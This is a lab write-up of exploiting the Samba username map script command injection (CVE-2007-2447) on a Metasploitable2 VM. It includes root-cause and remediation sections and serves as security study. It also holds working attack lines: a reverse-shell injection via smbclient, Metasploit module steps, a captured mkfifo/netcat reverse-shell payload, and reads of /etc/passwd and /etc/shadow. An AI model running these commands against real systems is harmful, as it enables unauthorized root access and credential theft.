Samba username map script Command Injection (CVE-2007-2447)
Target: Metasploitable2 (192.168.56.101) — SMB/Samba 3.0.20-Debian
1. Overview
Field	Detail
Target	Metasploitable2 — 192.168.56.101
Service	Samba smbd 3.0.20-Debian (SMB — ports 139/445)
Vulnerability Class	OS Command Injection
CVE	CVE-2007-2447
Impact	Unauthenticated remote root shell
Tools Used	smbclient, Metasploit Framework, Wireshark, netcat

This engagement targeted the SMB service on Metasploitable2, a deliberately vulnerable Linux VM used for authorized lab practice. SMB is the file/printer-sharing protocol used to let systems browse and access shared resources over a network — Samba is the open-source Linux implementation of that protocol. On this box, Samba is misconfigured with a legacy admin feature (username map script) that turns out to be exploitable for full remote code execution as root.

2. Root Cause

Samba's username map script option lets an administrator hand off client-supplied usernames to an external script, so unconventional usernames can be mapped to valid local Linux accounts. Internally, the client-supplied username string is passed into a shell command without sanitization:

/bin/sh -c "<mapping_script> '<attacker-controlled username>'"

Because the username is concatenated directly into a string that's evaluated by /bin/sh, any shell metacharacters inside it — backticks, $(), semicolons — are interpreted as shell syntax rather than literal text. This is functionally identical to a classic SQL injection: untrusted input reaches an interpreter without escaping or parameterization, just with a shell interpreter instead of a SQL parser.

3. Manual Exploitation Attempt (and why it failed)

The textbook version of this attack sends the SMB username as a subshell expression:

bash
smbclient //192.168.56.101/tmp -U "/=\`nohup nc -e /bin/bash 192.168.56.102 4444\`"

In practice, this repeatedly failed with NT_STATUS_LOGON_FAILURE:

$ smbclient //192.168.56.101/tmp -U "/=\`nohup nc -e /bin/bash 192.168.56.102 4444\`"
Password for ['NOHUP NC -E /BIN/BASH 192.168.56.102 4444`']:
session setup failed: NT_STATUS_LOGON_FAILURE

Why this happened: smbclient's -U flag parses the string on the client side before the SMB request is even sent — quoting/escaping between bash and smbclient's own username%password parser has to survive two layers of interpretation (bash's shell, then smbclient's internal parsing) before it ever reaches the vulnerable server-side script. Several quoting combinations were tried (\`` vs 'vs unescaped backticks), and each either got mangled by bash before smbclient saw it, or by smbclient before it was sent on the wire — thesmbclient` prompt literally echoing back a garbled, uppercased version of the payload as a "password" field confirms the string wasn't reaching the server intact.

An anonymous session listing confirmed the target and shares were reachable and correctly enumerated (smbclient -L //192.168.56.101/ -N → Anonymous login successful, shares print$, tmp ("oh noes!"), opt, IPC$), ruling out a network/target issue — the failure was specifically in getting the malicious payload through client-side parsing intact.

Lesson: exploiting command injection isn't just "know the payload" — the delivery mechanism (in this case, a CLI tool's own argument parsing) can silently corrupt the payload before it reaches the vulnerable code path. This is a real-world reminder that manual exploitation requires understanding every layer the string passes through, not just the final interpreter.

4. Successful Exploitation — Metasploit

Given the client-side parsing issue above, the Metasploit module was used, which builds and delivers the payload correctly at the protocol level rather than through a CLI wrapper.

msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
msf exploit(multi/samba/usermap_script) > set RPORT 139
msf exploit(multi/samba/usermap_script) > set LPORT 5555
msf exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 192.168.56.102:5555
[*] Command shell session 1 opened (192.168.56.102:5555 -> 192.168.56.101:33898)

whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

Immediate remote root, no credentials required.

5. Wire-Level Evidence (Wireshark)

Capturing traffic on eth0 with the filter smb || smb2 during exploitation shows the entire malicious payload sitting in plaintext inside a legitimate-looking SMB Session Setup AndX Request packet:

Session Setup AndX Request, User: .\/=`nohup mkfifo /tmp/rtqw;
nc 192.168.56.102 5555 0</tmp/rtqw | /bin/sh >/tmp/rtqw 2>&1; rm /t...`

This is the real value of pairing exploitation with packet capture: it proves the "exploit" isn't a mystery binary or shellcode — it's a normal-looking authentication field carrying an unsanitized command, sent over an unencrypted protocol. SMB1 here has no transport encryption, so the entire injected payload is visible to anyone capturing traffic on the same segment — a second, independent finding beyond the injection bug itself (this service should not be exposing authentication traffic in cleartext regardless of the injection flaw).

The payload itself is worth reading closely: it uses mkfifo to create a named pipe, then wires nc and /bin/sh to it in both directions — a manual reverse shell construction technique that doesn't rely on nc -e (which isn't present on all netcat builds). Understanding this construction is useful independent of the vulnerability — it's a general-purpose reverse shell pattern worth recognizing on sight.

6. Post-Exploitation

With a root shell established, the following was performed to demonstrate impact:

bash
cat /etc/passwd    # full local account enumeration
cat /etc/shadow    # password hash dump — only readable as root

This confirmed full compromise: root-level access allowed reading of the shadow file, which under normal conditions is one of the most tightly restricted files on a Linux system. In a real engagement, next steps here would include offline hash cracking (john/hashcat) to assess password strength, and checking for credential reuse across other in-scope systems.

7. Remediation
Disable username map script unless absolutely required; it is a legacy feature with no safe implementation pattern for untrusted input.
If required, the receiving script must treat the username as a single opaque argument (e.g., via execve()-style argument arrays) rather than building a shell string — the same fix pattern as any command injection: never concatenate untrusted input into a string handed to a shell interpreter.
Patch to a modern Samba version; this vulnerability was fixed by removing the vulnerable code path entirely (Samba 3.0.25 and later).
Enforce SMB signing/encryption (SMB3 with encryption) to prevent cleartext credential and payload exposure on the wire, independent of the injection issue.
8. Key Takeaways
Vulnerability class recognition transfers across protocols. This is command injection — the same root cause as OS command injection in a web app's exec()/system() call, just delivered over SMB instead of HTTP. The fix (parameterize, never concatenate) is identical.
CLI tool argument parsing is a real obstacle in manual exploitation. The payload was conceptually correct but failed repeatedly due to shell/client-side escaping — a good reminder to test payload delivery mechanics separately from payload logic.
Packet capture during exploitation adds real evidentiary value. Seeing the payload in cleartext on the wire demonstrates both the injection flaw and a secondary cleartext-transport weakness in one artifact.
High privilege + network-exposed + complex protocol parsing is a historically rich bug class (this CVE, EternalBlue, and many other SMB CVEs share this shape) — worth remembering when triaging which exposed services deserve the most scrutiny in an assessment.

Lab environment: Metasploitable2 (isolated host-only VirtualBox network) — authorized personal lab, no external systems targeted
